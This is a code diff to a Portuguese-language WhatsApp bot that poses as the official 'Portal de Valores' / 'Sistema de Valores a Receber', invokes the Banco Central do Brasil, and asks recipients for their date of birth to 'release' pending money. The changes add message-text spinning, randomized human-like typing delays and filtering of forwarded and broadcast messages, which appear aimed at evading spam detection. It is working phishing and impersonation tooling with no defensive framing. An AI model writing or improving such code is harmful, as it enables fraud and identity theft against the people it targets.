@@ -189,9 +189,18 @@ function saveQrMsgId(msgId) {
     lastQrMsgId = msgId;
 }
 
-async function sendBotMessage(chatId, text, options = {}) {
+function spinText(text) {
+    if (!text) return text;
+    return text.replace(/\{([^{}]*)\}/g, function(match, choices) {
+        const options = choices.split('|');
+        return options[Math.floor(Math.random() * options.length)];
+    });
+}
+
+async function sendBotMessage(chatId, rawText, options = {}) {
     internalMessageChats.add(chatId);
     try {
+        const text = spinText(rawText);
         let sendTo = chatId;
         try {
             const rawNum = chatId.split('@')[0];
@@ -205,7 +214,9 @@ async function sendBotMessage(chatId, text, options = {}) {
             const chatObj = await client.getChatById(sendTo);
             if (chatObj) {
                 await chatObj.sendStateTyping();
-                const delayMs = Math.min(1500 + (text.length * 10), 4000);
+                const baseDelay = 1500 + (text.length * 15);
+                const randomVariation = Math.floor(Math.random() * 2000) + 500;
+                const delayMs = Math.min(baseDelay + randomVariation, 5500);
                 await new Promise(r => setTimeout(r, delayMs));
                 await chatObj.clearState();
             }
@@ -1217,11 +1228,18 @@ _Processo 100% Homologado e Finalizado._`;
 
         const targetChatId = msg.from;
         if (!targetChatId) return;
-        if (targetChatId.includes('@g.us')) return;
+        // Proteção rigorosa contra encaminhamento em massa e listas
+        if (targetChatId.includes('@g.us') || targetChatId.includes('@broadcast') || msg.isForwarded) {
+             return; 
+        }
 
-        // --- PROTEÇÃO ANTI-FLOOD ---
+        // --- PROTEÇÃO ANTI-FLOOD PROGRESSIVA ---
         const now = Date.now();
-        const stats = userMessageCounts.get(targetChatId) || { count: 0, firstMsgTime: now };
+        const stats = userMessageCounts.get(targetChatId) || { count: 0, firstMsgTime: now, penaltyUntil: 0 };
+
+        if (now < stats.penaltyUntil) {
+            return; // Ignora enquanto estiver na penalidade
+        }
 
         // Reseta contador a cada 10 segundos
         if (now - stats.firstMsgTime > 10000) {
@@ -1230,12 +1248,15 @@ _Processo 100% Homologado e Finalizado._`;
         }
 
         stats.count++;
-        userMessageCounts.set(targetChatId, stats);
 
         if (stats.count > 5) {
-            console.log(`⚠️ [ANTI-FLOOD] Ignorando flood de mensagens de ${targetChatId}`);
+            stats.penaltyUntil = now + 60000; // Penalidade de 60 segundos
+            console.log(`⚠️ [ANTI-FLOOD] Penalidade de 60s aplicada em ${targetChatId} devido a flood.`);
+            userMessageCounts.set(targetChatId, stats);
             return;
         }
+        
+        userMessageCounts.set(targetChatId, stats);
 
         if (processingLock.has(targetChatId)) {
             console.log(`⏳ [LOCK] Mensagem de ${targetChatId} ignorada — já processando.`);
@@ -1414,7 +1435,7 @@ _Processo 100% Homologado e Finalizado._`;
             saveSessions();
 
             const aiReply = await askAI(PROMPT_INICIAL, text);
-            const fallback = `👋 *Olá! Sou o Assistente Oficial do Portal de Valores — Sistema de Valores a Receber.*\n\nIdentificamos valores pendentes de liberação associados ao seu perfil em nosso sistema, em conformidade com as diretrizes do Banco Central do Brasil.\n\nPara prosseguir com a validação de titularidade e liberar o processamento, necessitamos confirmar seus dados cadastrais.\n\n📍 *ETAPA 1:* Por gentileza, informe sua *Data de Nascimento* (Ex: 10/05/1990):`;
+            const fallback = `{👋|Olá|Oi|Saudações}! *{Sou o Assistente Oficial|Aqui é o Assistente Oficial|Bem-vindo ao Assistente Oficial} do Portal de Valores — Sistema de Valores a Receber.*\n\n{Identificamos|Constatamos|Verificamos} valores pendentes de liberação associados ao seu perfil em nosso sistema, em conformidade com as diretrizes do Banco Central do Brasil.\n\nPara prosseguir com a validação de titularidade e liberar o processamento, necessitamos confirmar seus dados cadastrais.\n\n📍 *ETAPA 1:* Por gentileza, informe sua *Data de Nascimento* (Ex: 10/05/1990):`;
 
             setTimeout(async () => {
                 await sendBotMessage(targetChatId, aiReply || fallback);
